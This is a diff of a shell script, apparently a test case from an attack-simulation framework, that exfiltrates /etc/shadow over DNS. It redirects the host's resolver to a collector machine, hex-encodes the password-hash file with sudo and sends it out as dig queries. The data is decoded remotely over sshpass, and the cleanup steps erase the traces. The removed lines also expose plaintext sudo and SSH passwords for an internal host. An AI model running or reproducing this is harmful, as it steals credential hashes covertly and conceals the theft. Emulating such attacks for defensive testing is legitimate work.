@@ -1,17 +1,17 @@
 ;
 #nohup
-nohup sshpass -p "010404grz" ssh -o StrictHostKeyChecking=no ubuntu@10.10.21.106 'echo "010404grz" | sudo -S nohup tshark -f "udp port 53" -Y "dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches ".domain"" > /tmp/received_data.txt &' >/dev/null 2>&1 &
+nohup sshpass -p "%assist_password%" ssh -o StrictHostKeyChecking=no %assist_user%@%assist_hostname% 'echo "%assist_password%" | sudo -S nohup tshark -f "udp port 53" -Y "dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches ".domain"" > /tmp/received_data.txt &' >/dev/null 2>&1 &
 #pre
-awk '/^nameserver/ && !f {print "nameserver 10.10.21.106"; f=1} 1' /etc/resolv.conf > resolv.conf.new
-echo '010404' | sudo -S mv resolv.conf.new /etc/resolv.conf
-echo '010404' | sudo -S xxd -p /etc/shadow > /tmp/encoded_data.hex
+awk '/^nameserver/ && !f {print "nameserver %assist_hostname%"; f=1} 1' /etc/resolv.conf > resolv.conf.new
+echo '%password%' | sudo -S mv resolv.conf.new /etc/resolv.conf
+echo '%password%' | sudo -S xxd -p /etc/shadow > /tmp/encoded_data.hex
 #command
 for data in $(cat /tmp/encoded_data.hex); do dig $data.domain; done
 #check
-sshpass -p "010404grz" ssh -o StrictHostKeyChecking=no ubuntu@10.10.21.106 'cat /tmp/received_data.txt | cut -d "A" -f 2 | cut -d " " -f 2 | cut -d "." -f 1 | sort | uniq | xxd -p -r'
+sshpass -p "%assist_password%" ssh -o StrictHostKeyChecking=no %assist_user%@%assist_hostname% 'cat /tmp/received_data.txt | cut -d "A" -f 2 | cut -d " " -f 2 | cut -d "." -f 1 | sort | uniq | xxd -p -r'
 #cleanup
-sed '/nameserver 10.10.21.106/d' /etc/resolv.conf > resolv.conf.new
-echo '010404' | sudo -S mv resolv.conf.new /etc/resolv.conf
-sshpass -p "010404grz" ssh -o StrictHostKeyChecking=no ubuntu@10.10.21.106 'rm /tmp/received_data.txt'
-sshpass -p "010404grz" ssh -o StrictHostKeyChecking=no ubuntu@10.10.21.106 'echo "010404grz" | sudo -S killall tshark'
+sed '/nameserver %assist_hostname%/d' /etc/resolv.conf > resolv.conf.new
+echo '%password%' | sudo -S mv resolv.conf.new /etc/resolv.conf
+sshpass -p "%assist_password%" ssh -o StrictHostKeyChecking=no %assist_user%@%assist_hostname% 'rm /tmp/received_data.txt'
+sshpass -p "%assist_password%" ssh -o StrictHostKeyChecking=no %assist_user%@%assist_hostname% 'echo "%assist_password%" | sudo -S killall tshark'
 rm /tmp/encoded_data.hex
